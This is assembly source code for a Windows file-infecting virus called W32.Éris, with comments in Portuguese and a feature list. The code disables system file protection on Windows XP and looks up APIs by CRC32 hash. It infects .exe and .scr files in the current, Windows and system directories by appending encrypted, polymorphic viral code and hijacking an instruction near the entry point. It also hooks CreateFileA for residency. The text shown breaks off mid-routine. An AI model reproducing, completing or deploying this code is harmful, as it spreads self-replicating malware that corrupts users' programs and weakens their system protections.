   ;-----------------------------------------------------------
   ;                   W32.Éris by cH4R_
   ;-----------------------------------------------------------
   ;              http://www.charvx.cjb.net
   ;-----------------------------------------------------------
   ; Compile com:
   ; TASM32.EXE /i\TASM\INCLUDE /m9 /ml gremory.asm,,;
   ; TLINK32.EXE /Tpe /aa gremory.obj,gremory.exe,,import32.lib
   ;-----------------------------------------------------------
   ; - Multiplataforma (Win95/98/98SE/NT/2K/XP Home & Pro)
   ; - Busca de APIs por CRC32
   ; - Anti-SFC - Desativa SFC no WinXP (SP1)
   ; - Criptografia (pega chave por meio de hashing)
   ; - Polimorfismo
   ; - Payload ;D
   ; - Per-Process Residency
   ; - Entry-Point Obscuring (usando RGBLDE)
   ; - Structured Exception Handling
   ;-----------------------------------------------------------
   ; Obrigado a / Thanks to:
   ;
   ; Djinn - you know... i love you ;*
   ; roy g biv - Excellent LDE :D
   ; Billy - Good tutorial (per-process), Excellent virus (Kriz)
   ; Benny - Excellent tutorial (optimization), good virus (HIV)
   ; ancev - Vc estava certo, um engine poly cai mto bem. :P
   ;-----------------------------------------------------------

   .586
   .model flat,stdcall

   ; -----------------------------------------------------------------
   ;                  INCLUDES E FALSAS IMPORTAÇÕES
   ; -----------------------------------------------------------------

   extrn ExitProcess:proc

   include PE.INC         ; Include da 29A
   include MZ.INC         ; Include da 29A

   ; -----------------------------------------------------------------
   ;             ABREVIATURAS & MACROZ & DEFINIÇÕES
   ; -----------------------------------------------------------------

   CRLF equ <0Dh,0Ah>
   ofs equ offset
   bye equ byte ptr
   dwo equ dword ptr
   wod equ word ptr

   api macro x
   call dwo [ebp+x-delta]
   endm

   ; Tamanho de todo o código viral
   n_Eris equ (ofs Eris_Fim-ofs Eris)
   ; Tamanho da area do virus que pode ser encriptada pelo decriptador complexo
   n_Area equ (ofs Area_Fim-ofs Area)
   ; Tamanho da area do decriptador complexo
   n_Comp equ (ofs Eris_Fim-ofs DeCrypt)
   ; Tamanho da area do decriptador polimorfico
   n_Simp equ (ofs DeCrypt-ofs S_Dec)
   ; Tamanho maximo do decriptador polimorfico + decriptador complexo
   n_PMax equ n_Comp+n_Simp
   ; Número de APIs
   n_APIs equ (ofs _APIs_fim-ofs _APIs)/4
   ; Marca de infecção (Éris)
   marca equ "sirÉ"

   ; ---- Macro de SEH (by Jack Qwerty) ----

   pseh macro what2do
   local @@over_seh_handler
   call @@over_seh_handler
   mov esp,[esp+08h]
   what2do
   @@over_seh_handler:
   xor edx,edx
   push dword ptr fs:[edx]
   mov dword ptr fs:[edx],esp
   endm

   rseh macro
   xor edx,edx
   pop dword ptr fs:[edx]
   pop edx
   endm

   ; ---- Parametros de APIs ----

   DRIVE_REMOVABLE equ 2
   DRIVE_FIXED equ 3
   DRIVE_REMOTE equ 4

   MEM_COMMIT_RESERVE equ 03000h
   MEM_RELEASE equ 08000h

   CREATE_NEW equ 1
   CREATE_ALWAYS equ 2
   OPEN_EXISTING equ 3
   OPEN_ALWAYS equ 4
   FILE_ATTRIBUTE_NORMAL equ 80h
   GENERIC_READ equ 80000000h
   GENERIC_WRITE equ 40000000h
   FILE_SHARE_READ equ 1
   FILE_BEGIN equ 0
   FILE_CURRENT equ 1
   FILE_END equ 2

   PROCESS_VM_WRITE equ 0020h

   PAGE_EXECUTE_READWRITE equ 40h
   PAGE_READWRITE equ 4h

   ; ---- Estruturas ----

   SYSTEMTIME STRUC
   wYear dw ?
   wMonth dw ?
   wDayOfWeek dw ?
   wDay dw ?
   wHour dw ?
   wMinute dw ?
   wSecond dw ?
   wMilliseconds dw ?
   SYSTEMTIME ENDS

   SZ_SYSTEMTIME equ SIZE SYSTEMTIME

   FILETIME STRUC
   FT_dwLowDateTime dd ?
   FT_dwHighDateTime dd ?
   FILETIME ENDS

   WIN32_FIND_DATA STRUC
   WFD_dwFileAttributes dd ?
   WFD_ftCreationTime FILETIME ?
   WFD_ftLastAccessTime FILETIME ?
   WFD_ftLastWriteTime FILETIME ?
   WFD_nFileSizeHigh dd ?
   WFD_nFileSizeLow dd ?
   eWFD_dwReserved0 dd ?
   WFD_dwReserved1 dd ?
   WFD_szFileName db 104h DUP (?)
   WFD_szAlternateFileName db 0Dh DUP (?)
   DB 3 DUP (?)
   WIN32_FIND_DATA ENDS

   SZ_WIN32_FIND_DATA equ SIZE WIN32_FIND_DATA

   OSVERSIONINFO STRUC
   dwOSVersionInfoSize dd ?
   dwMajorVersion dd ?
   dwMinorVersion dd ?
   dwBuildNumber dd ?
   dwPlatformId dd ?
   szCSDVersion db 80h dup (?)
   OSVERSIONINFO ENDS

   SZ_OSVERSIONINFO equ SIZE OSVERSIONINFO

   STACK_REG STRUCT
   _EDI dd ?
   _ESI dd ?
   _EBP dd ?
   _ESP dd ?
   _EBX dd ?
   _EDX dd ?
   _ECX dd ?
   _EAX dd ?
   STACK_REG ENDS

   STACK_REGS equ SIZE STACK_REG
   REGS_FLAGS equ STACK_REGS+4h

   ; -----------------------------------------------------------------
   ;                   Seções da primeira geração
   ; -----------------------------------------------------------------

   _TEXT segment dword use32 public 'CODE'

   inicio:

   xor al,al      ; AL = 0
   dec al         ; AL = 0FFh (maximo de infecções na primeira geração)

   call Eris      ; Éris - A deusa da discordia... ;)

   xor eax,eax    ; EAX = 0
   push eax       ; arg 0 = return to call
   push eax       ; arg 1 = exit code

              ; <-- o tasm colocará jump p/ ExitProcess aqui ;)

   _TEXT ends

   ; -----------------------------------------------------------------
   ;                       Seção do Éris
   ; -----------------------------------------------------------------

   newsection segment dword use32 public 'Éris'

   Eris:

   Area:

   ; ---- Delta-Offset ----

   call Delta_Offset

   mov [ebp+infec_max-delta],al   ; Maximo de infecções = AL

   ; ---- Localiza Kernel ----

   call ProcuraKrn                ; Procura kernel :D
   or eax,eax                     ;
   jnz termina_tudo               ; EAX != 0 ? Então vaza...
   mov [ebp+kernel-delta],ebx     ; Salva endereço

   ; ---- Localiza APIs ----

   push n_APIs       ; Numéro de APIs
   call _APIs_fim    ; Salta tabela de CRC32's

   _APIs label byte
   dd 0B09315F4h  ; CloseHandle
   dd 0553B5C78h  ; CreateFileA
   dd 0D9AC2453h  ; CreateMutexA
   dd 0D82BF69Ah  ; FindClose
   dd 0C9EBD5CEh  ; FindFirstFileA
   dd 075272948h  ; FindNextFileA
   dd 0DA68238Fh  ; FreeLibrary
   dd 0C79DC4E3h  ; GetCurrentDirectoryA
   dd 0D0861AA4h  ; GetCurrentProcess
   dd 0F6A56750h  ; GetDriveTypeA
   dd 030601C1Ch  ; GetFileAttributesA
   dd 0B1866570h  ; GetModuleHandleA
   dd 0C97C1FFFh  ; GetProcAddress
   dd 086B0A95Ah  ; GetSystemDirectoryA
   dd 0D22204E4h  ; GetSystemTime
   dd 0DF87764Ah  ; GetVersionExA
   dd 0FFF372BEh  ; GetWindowsDirectoryA
   dd 03FC1BD8Dh  ; LoadLibraryA
   dd 0095C03D0h  ; ReadFile
   dd 069B6849Fh  ; SetCurrentDirectoryA
   dd 0156B9702h  ; SetFileAttributesA
   dd 0EFC7EA74h  ; SetFilePointer
   dd 009CE0D4Ah  ; VirtualAlloc
   dd 0CD53F5DDh  ; VirtualFree
   dd 010066F2Fh  ; VirtualProtect
   dd 0CCE95612h  ; WriteFile
   dd 04F58972Eh  ; WriteProcessMemory
   _APIs_fim:

   pop esi                ; ESI = Ponteiro para a tabela
   pop ecx                ; ECX = Número de APIs
   lea edi,[ebp+api_addrs-delta]; EDI = Ponteiro para area de armazenar endereços

   api_loop:
   lodsd             ; Carrega CRC32 em EAX
   call AchaAPI      ; Manda achar a API
   stosd             ; Salva endereço em [EDI]
   loop api_loop     ; Loop ;)

   ; ---- Carrega SFC ----

   call pos_sfc                 ; String "SFC" na stack
   db "SFC",0
   pos_sfc:
   api LoadLibraryA             ; Carrega dll...

   mov [ebp+sfc_dll-delta],eax  ; Guarda o endereço

   call pos_sfcnome             ; String "SfcIsFileProtected" na stack
   db "SfcIsFileProtected",0
   pos_sfcnome:
   push eax                     ; Endereço da dll
   api GetProcAddress           ; Pega endereço da função...

   mov [ebp+sfc_func-delta],eax ; Salva endereço da função...
   or eax,eax                   ; EAX = 0 ?
   jz mutex_rnd                 ; Não tenta desativar SFC...

   ; ---- Verifica se pode-se desativar o SFC ----

   xor eax,eax          ; EAX = 0
   push PAGE_READWRITE  ; Protect
   push MEM_COMMIT_RESERVE ; AllocationType
   push SZ_OSVERSIONINFO ; Size
   push eax             ; Address
   api VirtualAlloc     ; Aloca...
   or eax,eax           ; EAX = 0 ?
   jz mutex_rnd         ; Então vaza...

   mov edi,eax         ;
   mov eax,SZ_OSVERSIONINFO
   push edi            ;
   push edi            ;
   stosd               ;

   api GetVersionExA   ; Pega informações de versão...

   pop eax                        ;
   mov ebx,eax                    ; EBX = EAX
   sub [eax.dwMajorVersion],5     ; MajorVersion = 5 ?
   jnz sfcxp_libera               ; Não? Então vaza...
   dec [eax.dwMinorVersion]       ; MinorVersion = 1 ?
   jnz sfcxp_libera               ; Não? Então vaza...
   mov eax,dwo [eax.szCSDVersion] ; Tem SP2 ?
   or eax,eax                     ; Sim?
   jnz sfcxp_libera               ; Então vaza...

   push ebx            ; Salva EBX
   call FerraXPSFC     ; Desabilita SFC...
   pop ebx             ; Recupera EBX

   sfcxp_libera:
   xor eax,eax
   push MEM_RELEASE    ; FreeType
   push eax            ; Size
   push ebx            ; Address
   api VirtualFree     ; Libera memoria...

   ; ---- Mutex & Random Seed ----
   mutex_rnd:
   xor eax,eax              ; EAX = 0
   call @@mutex_name        ; Endereço para o nome do mutex na stack
   db "For my sweet Djinn"  ;
   db 0                     ;
   @@mutex_name:            ;
   push eax                 ;
   push eax                 ;
   api CreateMutexA         ; cria mutex...

   call seed                ; Gera uma random seed...

   ; ---- Funções principais do virus ----

   call PerProc             ; * Per-Process Resindency

   call SSD                 ; * Search & Seek & Destroy ;D

   call Payload             ; * Payload

   ; ---- Descarrega SFC ----

   mov eax,[ebp+sfc_dll-delta]      ; EAX = Handle de "SFC.DLL"
   push eax                         ;
   api FreeLibrary                  ; Libera DLL...

   ; ---- Conserta o hospedeiro ----

   mov ecx,dwo [ebp+host_org-delta] ; ECX = 4 primeiros bytes originais do hosp.
   jecxz termina_tudo               ; ECX = 0 ? Então é primeira geração... vaza.

   conserta:
   api GetCurrentProcess        ; Pega uma pseudo-handle pro nosso processo

   mov edi,[esp+REGS_FLAGS]     ; EDI = Endereço de retorno...
   sub edi,5                    ; EDI-= 5
   lea esi,[ebp+host_org-delta] ; ESI = Bytes originais do hospedeiro

   xor ebx,ebx
   push ebx                     ; lpNumberOfBytesWritten
   push 5                       ; nSize
   push esi                     ; lpBuffer
   push edi                     ; lpBaseAddress
   push eax                     ; hProcess
   api WriteProcessMemory       ; Escreve... ;)
   xchg eax,ecx                 ; ERRO ? Nem pensar !
   jecxz conserta               ; Tenta denovo...

   mov [esp+REGS_FLAGS],edi     ; Troca o endereço de retorno...
   popad                        ; Recupera todos os regs.
   popfd                        ; Recupera flags...

   ; ---- Finaliza e volta pro hospedeiro ----

   termina_tudo:
   ret                          ; Retorna...

   ; -----------------------------------------------------------------
   ;            Desabilita SFC no WinXP sem Service Pack 2
   ; -----------------------------------------------------------------

   FerraXPSFC proc

   call @xp_sfcn                   ; nome da dll na stack "SFC_OS"(.dll)
   db "SFC_OS",0                   ;
   @xp_sfcn:                       ;
   api GetModuleHandleA            ; pega Handle...
   xchg eax,ecx                    ; Troca EAX com ECX...
   jecxz ferrasfc_fim              ; ECX = 0 ? Então vaza...

   add eax,0EEB8h                  ; EAX + VA do codigo que vamos mudar...

   lea ebx,[ebp+FH-delta]          ; EBX = Ponteiro para armazenarmos Oldprotection
   push eax                        ; Salva EAX!
   push ebx                        ; Salva EBX!
   push ebx                        ; Oldprotect
   push PAGE_EXECUTE_READWRITE     ; Newprotect
   push 2                          ; Size
   push eax                        ; Address
   api VirtualProtect              ; (UN)Protect...
   pop ebx                         ; Recupera EBX!
   pop edi                         ; Recupera EAX em EDI!
   xchg eax,ecx                    ; Troca EAX com ECX
   jecxz ferrasfc_fim              ; ECX = 0 ? Então vaza...

   xor wod [edi],561Bh             ; Muda 8BC6 (mov eax,esi) para 9090 (nop/nop)

   lea eax,[ebp+Mem-delta]         ; EAX = Ponteiro exigido pela api
   mov ebx,[ebx]                   ; EBX = Antigo valor de proteção da página
   push eax                        ; OldProtect
   push ebx                        ; NewProtect
   push 2                          ; Size
   push edi                        ; Address
   api VirtualProtect              ; Protect...

   xor eax,eax                     ; EAX = 0
   mov [ebp+sfc_func-delta],eax    ; SFC_FUNC = EAX

   ferrasfc_fim:
   ret                             ; Retorna...

   FerraXPSFC endp

   ; -----------------------------------------------------------------
   ;                  Search, Seek and Destroy
   ; -----------------------------------------------------------------

   ; --- Função principal ----

   SSD proc

   call AlocaW32FD             ; Aloca memória para WIN32_FIND_DATA e diretórios
   jecxz ssd_fim               ; ECX = 0 ? Então vaza pq falhamos...

   mov edi,[ebp+busca-delta]   ; EDI = Ponteiro para memoria virtual
   add edi,SZ_WIN32_FIND_DATA  ; EDI + WIN32_FIND_DATA

   push edi                    ; Buffer para o diretorio
   push 105h                   ; Tamanho do buffer
   api GetCurrentDirectoryA    ; Pega diretorio atual...
   add edi,105h                ; Anda com EDI...

   push 105h                   ; Buffer para o diretorio
   push edi                    ; Tamanho do buffer
   api GetWindowsDirectoryA    ; Pega diretorio do windows...
   add edi,105h                ; Anda com EDI...

   push 105h                   ; Buffer para o diretorio
   push edi                    ; Tamanho do buffer
   api GetSystemDirectoryA     ; Pega diretorio do sistema...
   add edi,105h                ; Anda com EDI...

   call mbusca                 ; Diretório atual
   call mbusca                 ; Diretório de sistema
   call mbusca                 ; Diretório do windows

   call LiberaW32FD            ; Libera memória...

   ssd_fim:
   ret                         ; Retorna...

   ; --- Sub-função: Busca arquivos e muda de diretório...
   mbusca:
   push edi                    ; Salva EDI !
   call BuscaCDIR              ; Busca arquivos no diretório corrente...
   pop edi                     ; Recupera EDI !

   sub edi,105h                ; Subtrai EDI...
   push edi                    ; Buffer
   api SetCurrentDirectoryA    ; Seta diretorio...
   ret                         ; Retorna...

   SSD endp

   ; --- Sub-função: Aloca memória para o W32FD

   AlocaW32FD proc
   xor eax,eax          ; EAX = 0
   push PAGE_READWRITE  ; Protect
   push MEM_COMMIT_RESERVE ; AllocationType
   push SZ_WIN32_FIND_DATA+1000h ; Size
   push eax             ; Address
   api VirtualAlloc     ; Aloca...
   mov [ebp+busca-delta],eax  ; Salva ponteiro ! ;D
   xchg eax,ecx         ; Troca EAX com ECX...
   ret
   AlocaW32FD endp

   ; --- Sub-função: Libera memória alocada para o W32FD

   LiberaW32FD proc
   xor eax,eax         ; EAX = 0
   mov ebx,[ebp+busca-delta] ; EBX = Ponteiro para WIN32_FIND_DATA
   push MEM_RELEASE    ; FreeType
   push eax            ; Size
   push ebx            ; Address
   api VirtualFree     ; Libera memoria...
   ret
   LiberaW32FD endp

   ; --- Sub-função: Manda buscar *.exe,*.scr e *.cpl no diretório...

   BuscaCDIR proc

   call @msk1          ; Ponteiro p/ "*.EXE", na stack
   db "*.exe",0
   @msk1:
   call BuscaEXEC      ; Manda procurar...

   call @msk2          ; Ponteiro p/ "*.SCR", na stack
   db "*.scr",0
   @msk2:
   call BuscaEXEC      ; Manda procurar...

   ret

   BuscaCDIR endp

   ; --- Sub-função: Busca arquivo especificado e manda infectar
   ; Entrada:
   ; Arg1 = Mascara de busca

   BuscaEXEC proc

   mov eax,[ebp+busca-delta]     ; EAX = Ponteiro para W32_FIND_DATA
   push eax                      ;
   push dwo [esp+8]              ;
   api FindFirstFileA            ; Procura...
   inc eax                       ; EAX++
   jz bexec_fim                  ; EAX = 0 ? Então vaza...
   dec eax                       ; EAX--
   mov [ebp+SH-delta],eax        ; Salva handle!

   procuramais:
   call Infecta                  ; Manda infectar...

   mov eax,[ebp+SH-delta]        ; EAX = Search handle
   mov ebx,[ebp+busca-delta]     ; EBX = Ponteiro p/ W32_Find_Data
   push ebx                      ;
   push eax                      ;
   api FindNextFileA             ; Procura proximo...
   or eax,eax                    ; EAX != 0 ?
   jnz procuramais               ; Então procura mais...

   mov ebx,[ebp+SH-delta]        ; EBX = Search handle
   push ebx                      ;
   api FindClose                 ; Termina busca...

   bexec_fim:
   ret 4                         ; Retorna...

   BuscaEXEC endp

   ; --- Sub-função: Infecta executáveis PE

   Infecta proc

   mov edi,[ebp+busca-delta]       ; EDI = Estrutua W32_FIND_DATA
   lea esi,[edi.WFD_szFileName]    ; ESI = Ponteiro para nome do arquivo
   xor eax,eax                     ; EAX = 0
   mov ecx,[ebp+sfc_func-delta]    ; ECX = SfcIsFileProtected
   jecxz @pula_chksfc              ; ECX = 0 ? Então pula essa parte..

   push esi                        ; filename
   push eax                        ; sfchandle
   call ecx                        ; SfcIsFileProtected ?

   @pula_chksfc:
   or eax,eax                      ; EAX != 0 ?
   jnz infec_fim                   ; Então vaza...

   push esi                        ;
   api GetFileAttributesA          ; Pega atributos...

   push eax                        ; Salva EAX ! (atributos do arquivo)
   push 80h                        ; atributos de arquivo normal...
   push esi                        ;
   api SetFileAttributesA          ; Seta atributos...

   xor eax,eax          ; EAX = 0
   push eax             ; hTemplateFile
   push eax             ; wFlagsAndAttributes
   push OPEN_EXISTING   ; dwCreationDistribution
   push eax             ; lpSecurityAttributes
   push eax             ; dwShareMode
   push GENERIC_READ or GENERIC_WRITE   ; wDesiredAccess
   push esi             ; lpFileName
   api CreateFileA      ; ...
   inc eax              ; EAX++
   jz recupera_attr     ; EAX=0? Então vaza...
   dec eax              ; EAX--

   mov [ebp+FH-delta],eax  ; Salva FileHandle !

   xor eax,eax             ; EAX = 0
   mov ecx,eax             ; ECX = 0
   mov ch,20h              ; ECX = 0002000h (8Kb)
   add ecx,[edi.WFD_nFileSizeLow] ; ECX += Tamanho do arquivo
   push PAGE_READWRITE     ; Protect
   push MEM_COMMIT_RESERVE ; AllocationType
   push ecx                ; Size
   push eax                ; Address
   api VirtualAlloc        ; Aloca...
   or eax,eax              ; EAX = 0 ?
   jz fecha_arq            ; Então vaza...

   mov [ebp+Mem-delta],eax ; Salva ponteiro para memória...
   mov ecx,[edi.WFD_nFileSizeLow] ; ECX = Tamanho do arquivo...
   mov edi,[ebp+FH-delta]  ; EDI = FileHandle
   xor ebx,ebx             ; EBX = 0
   push ebx                ; lpOverlapped
   call @nobr              ; lpNumberOfBytesRead
   dd ?
   @nobr:
   push ecx                ; nNumberOfBytesToRead
   push eax                ; lpBuffer
   push edi                ; hFile
   api ReadFile            ; Lê...
   or eax,eax              ; EAX = 0 ?
   jz libera_mem           ; Então vaza...

   xor eax,eax             ; EAX = 0
   push FILE_BEGIN         ; dwMoveMethod
   push eax                ; pDistanceToMoveHigh
   push eax                ; lDistanceToMove
   push edi                ; hFile
   api SetFilePointer      ; Move ponteiro...

   mov edi,[ebp+Mem-delta] ; EDI = Ponteiro para onde o arquivo está mapeado...
   mov esi,edi             ; ESI = EDI

   ;---- Checagem de imagem ----

   cmp wod [esi],"ZM"      ; Tem assinatura MZ ?
   jnz libera_mem          ; Senão vaza...
   add esi,[edi+3Ch]
   cmp wod [esi],"EP"      ; Tem assinatura PE ?
   jnz libera_mem          ; Senão vaza..

   ; É dll ? (não pode ser de jeito nenhum)
   test [esi.IMAGE_NT_HEADERS.NT_FileHeader.FH_Characteristics],IMAGE_FILE_DLL
   jnz libera_mem       ; Sim ? Então vaza

   ; Tá infectado ?
   cmp [esi.IMAGE_NT_HEADERS.NT_FileHeader.FH_PointerToSymbolTable],marca
   jz libera_mem         ; Sim ? Então vaza..

   ;---- Localização do EntryPoint do programa ----

   ; Vá até o entrypoint
   mov eax,[esi.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_AddressOfEntryPoint] ; EAX = EP

   ; ECX = número de seções
   movzx ecx,[esi.IMAGE_NT_HEADERS.NT_FileHeader.FH_NumberOfSections]
   inc ecx                  ; Até a ultima seção ;)
   lea edx,[esi+0F8h]           ; EDX = Ponteiro para o cabeçalho de seções
   scan:                    ; Loop que scaneia as seções
   cmp [edx.SH_VirtualAddress],eax      ; VirtualAddress da seção <= EAX ?
   jle achamos              ; Então vamos mais a frente...
   add edx,IMAGE_SIZEOF_SECTION_HEADER  ; Proxima seção
   loop scan                ;
   jmp libera_mem               ; Se sair direto eh pq deu pau, então vaza.

   achamos:
   push eax                             ; Salva EAX !
   sub eax,[edx.SH_VirtualAddress]      ; EAX = EP - VirtualAddress da seção dele
   mov ecx,[edx.SH_SizeOfRawData]       ; ECX = Tamanho da seção
   sub ecx,eax                          ; ECX-= EAX
   add eax,[edx.SH_PointerToRawData]    ; EAX+= VA para o código da seção
   add eax,edi                  ; EAX = Ponteiro para o código da seção
   pop edi                              ; Recupera em EDI...

   ;---- Procura de instrução maior do que 4 bytes ----

   push esi                           ; Salva ESI !
   mov ecx,[edx.SH_PointerToRawData]  ; ECX = Tamanho da seção
   mov edx,eax                        ; EDX = Ponteiro para o código da seção
   mov esi,edx                        ; ESI = EDX
   push ebp                           ; Salva EBP para o caso de um erro...
   push edx                           ; Salva EDX, q é altera qdo se instala SEH
   pseh <jmp @handler>                ; Poe SEH...

   @loop_ins:                         ; Loop para achar instrução > 4 bytes
   cmp [esi],eax                      ; Usado como isca para a SEH...
   call get_opsize                    ; RGBLDE (roy g biv LDE)
   cmp eax,4                          ; EAX > 4 ?
   ja achamos_ins                     ; Se sim, então achamos...
   add esi,eax                        ; ESI+= EAX
   loop @loop_ins                     ; Tenta novamente...

   @handler:
   xor eax,eax                        ; EAX = 0

   achamos_ins:
   rseh                               ; Tira SEH..
   pop edx                            ; Recupera EDX !
   pop ebp                            ; Recupera EBP !
   mov ebx,esi                        ; EBX = ESI (Ponteiro para instrução)
   pop esi                            ; Recupera ESI !
   or eax,eax
   jz libera_mem

   ;---- Salvamento de dados da infecção atual ----

   ; Marca como infectado
   mov [esi.IMAGE_NT_HEADERS.NT_FileHeader.FH_PointerToSymbolTable],marca

   mov eax,[ebp+host_org-delta]    ; EAX = Instrução guardada...
   push eax                        ; Salva !
   mov al,[ebp+host_org+4-delta]   ; AL = Instrução guardada...
   push eax                        ; Salva !

   mov eax,[ebx]                   ; EAX = Instrução do futuro hospedeiro...
   mov [ebp+host_org-delta],eax    ; Salva no codigo
   mov al,[ebx+4]                  ; AL = Instrução do futuro hospedeiro...
   mov [ebp+host_org+4-delta],al   ; Salva no codigo

   push ebx                        ; Salva endereço para uso futuro...

   ;---- Calculo do salto entre o codigo do programa e o codigo do virus ----

   sub ebx,edx                     ; EBX = EBX - EDX (distancia entre EP e inst.)
   add edi,ebx                     ; EDI+= EBX (VA da inst.)
   ; EBX = Número de seções
   movzx ebx,[esi.IMAGE_NT_HEADERS.NT_FileHeader.FH_NumberOfSections]
   lea edx,[esi+0F8h]      ; EDX = Ponteiro para o cabeçalho de seções
   imul ebx,ebx,28h        ; EBX = BX * 28h
   add edx,ebx         ; EDX = Ponteiro para o fim da ultima seção
   sub edx,28h         ; EDX = Ponteiro para a ultima seção
   mov ebx,[edx.SH_SizeOfRawData] ; EBX = SizeOfRawData

   ; EAX = Image Base
   mov eax,[esi.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_ImageBase]
   mov [ebp+baseaddr-delta],eax   ; Salva no código para a proxima geração..
   add ebx,eax                    ; EBX+= Image Base
   add ebx,[edx.SH_VirtualAddress]; EBX+= VirtualAddress da seção
   add edi,eax                   ; EDI+= Image Base = Endereço virtual da instrução

   pop eax         ; Recupera endereço salvo !
   add edi,5       ; EDI = 5 (5 bytes da CALL)
   add ebx,n_Area  ; EBX+= Area encriptado = Area do inicio do decriptador poly.

   sub ebx,edi        ; EBX = Distancia entre os pontos (immed32)
   mov [eax+1],ebx    ; Poe immed32 no codigo do hospedeiro...
   mov bye [eax],0E8h ; Poe instrução de CALL

   ;---- Infecção da ultima seção ----

   mov eax,[edx.SH_SizeOfRawData]         ; SizeOfRawData
   mov edi,eax                        ; EDI = SizeOfRawData
   add eax,n_Eris                         ; EAX+= Tamanho do virus
   ; ECX = Fator de alinhamento
   mov ecx,[esi.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_FileAlignment]
   push edx                               ; Salva EDX
   call Alinha                            ; Alinha...
   pop edx                                ; Recupera EDX
   add edi,[edx.SH_PointerToRawData]      ; EDI = Fim da ultima seção
   mov [edx.SH_SizeOfRawData],eax         ; Novo SizeOfRawData !!!
   mov [edx.SH_VirtualSize],eax           ; Novo VirtualSize !!!
   or bye [edx.SH_Characteristics+3],0C0h ; Seção R/W

   ;---- Copia para a ultima seção ----

   pushad                           ; Salva regs.

   mov eax,[edx.SH_VirtualAddress]  ; EAX = VA da seção
   add eax,[esi.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_ImageBase] ; EAX = RVA
   push eax                         ; Salva EAX !
   mov ebx,[edx.SH_PointerToRawData]; EBX = Ponteiro (raw) para seção
   add ebx,[ebp+Mem-delta]          ; EBX = Ponteiro no nosso mapeamento

   cld                              ; D = 0
   add edi,[ebp+Mem-delta]          ; EDI = Fim da ultima seção no nosso mapa
   lea esi,[ebp+Eris-delta]         ; ESI = Inicio do codigo
   mov ecx,n_Area                   ; ECX = Area que pode ser criptografada
   push edi                         ; Salva EDI !
   rep movsb                        ; Copia...

   pop edi                          ; Recupera EDI !

   ;---- Encriptação complexa ----

   push 7Fh                  ;
   call rand                 ; Pega numero randomico...
   mov [ebp+k_tam-delta],al  ; Salva tamanho no código
   pop ecx                   ; Recupera endereço virtual da area
   mov [ebp+k_buf-delta],ecx ; Salva no codigo

   push eax           ; Tamanho do buffer
   push ebx           ; Buffer
   call Hash64        ; Hashing...

   mov ecx,n_Area-4   ; ECX = Tamanho da area a ser decriptada

   enc_c:
   rcl eax,cl         ; RCL EAX,CL
   jnc no_enc         ; Bit = 0 ? Não encripta
   xor dwo [edi+ecx],eax  ; Encripta...
   no_enc:
   xor eax,ebx        ; XOR Chave, Modificador
   loop enc_c         ; Loop ;D

   ;---- Encriptação simples & Polimorfismo ----

   mov eax,edi        ;
   add eax,n_Area     ; EAX = Local depois da area encriptada

   call Crypt_Poly    ; Faz o serviço sujo.. :P

   popad              ; Recupera regs.

   ; ---- Recupera dados da infecção atual ----

   pop ebx
   pop eax
   mov [ebp+host_org+4-delta],bl
   mov [ebp+host_org-delta],eax

   ; ---- Escreve / Libera memoria / Fecha arquivo / Recupera atributos ----

   mov eax,[edx.SH_VirtualAddress] ;
   add eax,[edx.SH_SizeOfRawData]  ;
   mov dwo [esi.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_SizeOfImage],eax

   mov edi,[ebp+busca-delta]       ; EDI = W32_FIND_DATA
   ; ECX = File alignment
   mov ecx,[esi.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_FileAlignment]
   mov eax,[edi.WFD_nFileSizeLow]  ; EAX = Tamanho do arquivo
   add eax,n_Eris          ; EAX+= Tamanho do virus
   call Alinha         ; Alinha com o arquivo

   mov edi,[ebp+FH-delta]  ; EDI = FileHandle
   mov ebx,[ebp+Mem-delta] ; EBX = Ponteiro para memoria
   xor ecx,ecx             ; ECX = 0
   push ecx                ; lpOverlapped
   call @@@                ; lpNumberOfBytesWritten
   dd ?
   @@@:
   push eax                ; nNumberOfBytesToWrite
   push ebx                ; lpBuffer
   push edi                ; hFile
   api WriteFile           ; escreve...

   libera_mem:
   xor eax,eax         ; EAX = 0
   mov ebx,[ebp+Mem-delta] ; EBX = Ponteiro para memoria...
   push MEM_RELEASE    ; FreeType
   push eax            ; Size
   push ebx            ; Address
   api VirtualFree     ; Libera...

   fecha_arq:
   push edi                        ;
   api CloseHandle                 ; Fecha...

   recupera_attr:
   mov edi,[ebp+busca-delta]       ; EDI = Estrutua W32_FIND_DATA
   lea edi,[edi.WFD_szFileName]    ; EDI = Ponteiro para nome do arquivo
   push edi                        ; nome do arquivo
   api SetFileAttributesA          ; Seta atributos...

   infec_fim:
   ret                 ; Retorna...

   ;--- Sub-função: Calcula alinhamento
   ; Entrada:
   ; EAX = Valor a ser alinhado
   ; ECX = Fator de alinhamento
   ; Saida:
   ; EAX = Valor alinhado
   ; EDX = O valor foi alterado ? (boolean)

   Alinha:
   xor edx,edx   ; EDX = 0
   push eax      ; Salva EAX
   div ecx       ; Divide EAX por ECX
   pop eax       ; Volta com EAX (o quociente não importa, somente o resto)
   or edx,edx    ; Resto = 0 ?
   jz alinha_fim ; Então já está alinhado, sai fora...
   sub ecx,edx   ; ECX - EDX (fator de alinhamento - resto da divisão = complemento)
   add eax,ecx   ; EAX + ECX (valor a ser alinhado + complemento)
   alinha_fim:
   ret           ; Retorna...

   Infecta endp

   ; -----------------------------------------------------------------
   ;                   Per-Process Residency
   ; -----------------------------------------------------------------

   PerProc proc

   mov eax,0553B5C78h   ; EAX = CRC32 de CreateFileA
   call PegaIAT         ; Pega ponteiro na I.A.T.
   jc perproc_fim       ; Não achou ? Então vaza...

   mov edi,ebx                    ; EDI = Ponteiro para endereço da API, na IAT
   lea eax,[ebp+APIHooker-delta]  ; EAX = Ponteiro para interceptador da API
   stosd                          ; Escreve...

   perproc_fim:
   ret                  ; Retorna...

   PerProc endp

   ; --- Sub-função: Interceptador de chamadas da API CreateFileA

   APIHooker:
   push eax                       ; Aqui ficará o endereço da API
   pushad                         ; Salva regs...
   pushfd                         ; Salva flags...

   call Delta_Offset              ; Pega Delta-Offset

   mov eax,[ebp+CreateFileA-delta]; EAX = Endereço da API
   mov [esp+REGS_FLAGS],eax       ; Poe na stack...

   call AlocaW32FD                ; Aloca memória para Win32_Find_Data
   jecxz hook_fim                 ; ECX = 0 ? Então vaza...

   ; Acha final do nome...

   mov edi,[esp+REGS_FLAGS+8]     ; EDI = FileName
